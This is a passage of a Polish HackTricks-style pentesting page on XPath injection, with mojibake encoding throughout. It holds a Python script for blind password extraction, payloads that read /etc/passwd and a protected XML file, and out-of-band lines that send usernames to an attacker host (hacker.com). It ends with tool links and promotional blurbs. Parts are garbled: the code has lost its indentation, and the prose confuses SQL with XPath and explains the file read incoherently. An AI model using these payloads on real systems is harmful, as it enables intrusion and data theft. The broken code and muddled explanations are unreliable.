Aby zapobiec atakom wstrzykniÄ™cia XPath, naleÅ¼y zawsze korzystaÄ‡ z parametryzowanych zapytaÅ„ SQL lub innych mechanizmÃ³w, ktÃ³re automatycznie zabezpieczajÄ… dane wejÅ›ciowe przed wstrzykniÄ™ciem kodu. NaleÅ¼y rÃ³wnieÅ¼ unikaÄ‡ bezpoÅ›redniego budowania zapytaÅ„ SQL lub XPath na podstawie danych wejÅ›ciowych uÅ¼ytkownika.
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### Odczytaj plik

XPath Injection moÅ¼e byÄ‡ wykorzystane do odczytania zawartoÅ›ci plikÃ³w na serwerze. Aby to zrobiÄ‡, musisz znaleÅºÄ‡ odpowiednie zapytanie XPath, ktÃ³re pozwoli na odczytanie pliku. PoniÅ¼ej znajduje siÄ™ przykÅ‚ad zapytania XPath, ktÃ³re odczytuje zawartoÅ›Ä‡ pliku `/etc/passwd`:

```plaintext
' or 1=1 or ''='
```

W przypadku, gdy aplikacja jest podatna na atak XPath Injection, to zapytanie zostanie zinterpretowane jako prawdziwe i zwrÃ³ci wszystkie rekordy z bazy danych. MoÅ¼esz jednak zmodyfikowaÄ‡ to zapytanie, aby odczytaÄ‡ zawartoÅ›Ä‡ pliku. PoniÅ¼ej znajduje siÄ™ przykÅ‚ad zapytania XPath, ktÃ³re odczytuje zawartoÅ›Ä‡ pliku `/etc/passwd`:

```plaintext
' or 1=0 or 'a'='a' and contains(//user[1]/name/text(),document('file:///etc/passwd')) or 'a'='a
```

W tym przypadku, zapytanie zostanie zinterpretowane jako faÅ‚szywe, ale zawiera warunek `contains`, ktÃ³ry sprawdza, czy zawartoÅ›Ä‡ pliku `/etc/passwd` jest obecna w pierwszym rekordzie bazy danych. JeÅ›li tak, to zapytanie zwrÃ³ci prawdziwe, co oznacza, Å¼e plik zostaÅ‚ odczytany.

PamiÄ™taj, Å¼e XPath Injection moÅ¼e byÄ‡ niebezpieczne i powinieneÅ› go uÅ¼ywaÄ‡ tylko w celach pentestowych na legalnie dostÄ™pnych systemach.
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## Wykorzystanie OOB (Out-of-Band) 

Out-of-Band (OOB) to technika wykorzystywana w atakach XPath Injection, ktÃ³ra pozwala na wydostanie danych z aplikacji internetowej poprzez wysyÅ‚anie Å¼Ä…daÅ„ do zewnÄ™trznego serwera. Wykorzystuje ona funkcje zapytaÅ„ HTTP, DNS lub innych protokoÅ‚Ã³w komunikacyjnych do przekazywania danych z aplikacji do atakujÄ…cego.

### Wykorzystanie OOB w atakach XPath Injection

1. **Zapytania HTTP**: AtakujÄ…cy moÅ¼e wykorzystaÄ‡ zapytania HTTP, aby przekazaÄ‡ dane z aplikacji do swojego serwera. MoÅ¼e to obejmowaÄ‡ wysyÅ‚anie Å¼Ä…daÅ„ GET lub POST z odpowiednimi parametrami, ktÃ³re zawierajÄ… dane, ktÃ³re chce wydobyÄ‡.

2. **Zapytania DNS**: AtakujÄ…cy moÅ¼e wykorzystaÄ‡ zapytania DNS, aby przekazaÄ‡ dane z aplikacji do swojego serwera DNS. MoÅ¼e to obejmowaÄ‡ manipulacjÄ™ nazwami domen, aby zawieraÅ‚y dane, ktÃ³re chce wydobyÄ‡. NastÄ™pnie atakujÄ…cy moÅ¼e monitorowaÄ‡ swoje serwery DNS, aby odebraÄ‡ te dane.

3. **Inne protokoÅ‚y komunikacyjne**: OprÃ³cz zapytaÅ„ HTTP i DNS, atakujÄ…cy moÅ¼e wykorzystaÄ‡ inne protokoÅ‚y komunikacyjne, takie jak SMTP (Simple Mail Transfer Protocol) lub FTP (File Transfer Protocol), do przekazywania danych z aplikacji do swojego serwera.

### PrzykÅ‚ad wykorzystania OOB w atakach XPath Injection

PrzykÅ‚adem wykorzystania OOB w atakach XPath Injection moÅ¼e byÄ‡ atak na aplikacjÄ™ internetowÄ…, ktÃ³ra wykonuje zapytania XPath na podstawie danych wprowadzonych przez uÅ¼ytkownika. AtakujÄ…cy moÅ¼e manipulowaÄ‡ tymi danymi, aby wydobyÄ‡ poufne informacje z aplikacji.

Na przykÅ‚ad, jeÅ›li aplikacja wykonuje zapytanie XPath na podstawie danych wprowadzonych przez uÅ¼ytkownika, atakujÄ…cy moÅ¼e wprowadziÄ‡ zÅ‚oÅ›liwe dane, ktÃ³re bÄ™dÄ… generowaÄ‡ zapytanie HTTP do swojego serwera. W ten sposÃ³b atakujÄ…cy moÅ¼e otrzymaÄ‡ poufne informacje, takie jak nazwy uÅ¼ytkownikÃ³w, hasÅ‚a lub inne dane wraÅ¼liwe.

### Zapobieganie wykorzystaniu OOB w atakach XPath Injection

Aby zapobiec wykorzystaniu OOB w atakach XPath Injection, naleÅ¼y podjÄ…Ä‡ nastÄ™pujÄ…ce Å›rodki ostroÅ¼noÅ›ci:

- **Walidacja danych wejÅ›ciowych**: Upewnij siÄ™, Å¼e dane wprowadzane przez uÅ¼ytkownika sÄ… poprawnie walidowane i filtrowane, aby zapobiec wstrzykiwaniu zÅ‚oÅ›liwego kodu XPath.

- **UÅ¼ywanie parametryzowanych zapytaÅ„**: Zamiast tworzyÄ‡ zapytania XPath na podstawie danych wprowadzonych przez uÅ¼ytkownika, naleÅ¼y uÅ¼ywaÄ‡ parametryzowanych zapytaÅ„, ktÃ³re oddzielajÄ… dane od kodu zapytania.

- **Ograniczanie uprawnieÅ„**: Ogranicz uprawnienia aplikacji, aby uniknÄ…Ä‡ dostÄ™pu do poufnych danych przez zÅ‚oÅ›liwe zapytania XPath.

- **Monitorowanie i logowanie**: Monitoruj i loguj zapytania XPath, aby wykryÄ‡ i Å›ledziÄ‡ potencjalne ataki OOB.

- **Regularne aktualizacje**: Regularnie aktualizuj oprogramowanie aplikacji, aby uniknÄ…Ä‡ znanych podatnoÅ›ci, ktÃ³re mogÄ… byÄ‡ wykorzystane w atakach OOB.
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### Automatyczne narzÄ™dzia

* [xcat](https://xcat.readthedocs.io/)
* [xxxpwn](https://github.com/feakk/xxxpwn)
* [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
* [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [XmlChor](https://github.com/Harshal35/XMLCHOR)

## OdwoÅ‚ania
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w hakerstwo**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i wglÄ…dom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
